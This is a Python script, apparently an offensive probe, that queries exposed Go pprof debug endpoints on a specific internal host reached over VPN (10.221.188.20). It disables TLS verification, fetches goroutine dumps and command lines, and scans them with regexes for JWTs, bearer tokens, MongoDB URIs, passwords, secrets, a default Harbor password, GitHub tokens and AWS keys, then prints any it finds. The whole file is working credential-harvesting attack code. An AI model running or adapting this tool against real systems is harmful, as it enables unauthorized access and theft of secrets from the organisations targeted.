#!/usr/bin/env python3
"""
Orka3 pprof Endpoint Probe
POST-VPN access required: http://10.221.188.20
Targets: /debug/pprof/* endpoints exposed by go net/http/pprof package

Usage (post-VPN):
  python3 orka_pprof_probe.py --target http://10.221.188.20
"""
import sys, re, subprocess, argparse
try:
    import requests
    requests.packages.urllib3.disable_warnings()
except ImportError:
    print("[-] pip install requests")
    sys.exit(1)

ENDPOINTS = [
    "/debug/pprof/",
    "/debug/pprof/cmdline",
    "/debug/pprof/goroutine?debug=2",
    "/debug/pprof/heap",
    "/debug/pprof/allocs",
    "/debug/pprof/trace?seconds=2",
]

# Patterns for credential extraction from pprof goroutine output
CRED_PATTERNS = [
    (re.compile(r'eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+'), 'JWT'),
    (re.compile(r'Bearer\s+([a-zA-Z0-9_./-]{20,})'), 'BEARER_TOKEN'),
    (re.compile(r'mongodb://[^\s"\']+'), 'MONGODB_URI'),
    (re.compile(r'password["\s:=]+([^\s"\']{8,})', re.I), 'PASSWORD'),
    (re.compile(r'secret["\s:=]+([^\s"\']{8,})', re.I), 'SECRET'),
    (re.compile(r'Harbor12345|harbor.*password', re.I), 'HARBOR_CRED'),
    (re.compile(r'ghp_[a-zA-Z0-9]{36}'), 'GITHUB_PAT'),
    (re.compile(r'AKIA[0-9A-Z]{16}'), 'AWS_ACCESS_KEY'),
]

def probe(target: str, timeout: int = 15):
    results = {}
    for ep in ENDPOINTS:
        url = target.rstrip('/') + ep
        try:
            r = requests.get(url, timeout=timeout, verify=False)
            results[ep] = {
                'status': r.status_code,
                'size': len(r.content),
                'accessible': r.status_code == 200,
                'content_preview': r.text[:200] if r.status_code == 200 else r.text[:100],
                'credentials': [],
            }
            if r.status_code == 200 and ep in ('/debug/pprof/goroutine?debug=2', '/debug/pprof/cmdline'):
                for pattern, label in CRED_PATTERNS:
                    matches = pattern.findall(r.text)
                    for m in matches:
                        results[ep]['credentials'].append({'type': label, 'value': m[:100]})
        except Exception as e:
            results[ep] = {'status': 'error', 'error': str(e)}
    return results

def main():
    p = argparse.ArgumentParser()
    p.add_argument('--target', default='http://10.221.188.20', help='Orka API base URL')
    args = p.parse_args()
    
    print(f"[*] Orka3 pprof probe: {args.target}")
    r = probe(args.target)
    for ep, d in r.items():
        status = d.get('status', '?')
        accessible = d.get('accessible', False)
        flag = '[ACCESSIBLE]' if accessible else '[blocked]'
        size = d.get('size', 0)
        print(f"\n  {flag} {ep} [{status}] {size}b")
        if d.get('credentials'):
            for c in d['credentials']:
                print(f"    [CRED] {c['type']}: {c['value']}")
        elif accessible:
            print(f"    Preview: {d.get('content_preview', '')[:120]}")

if __name__ == '__main__':
    main()
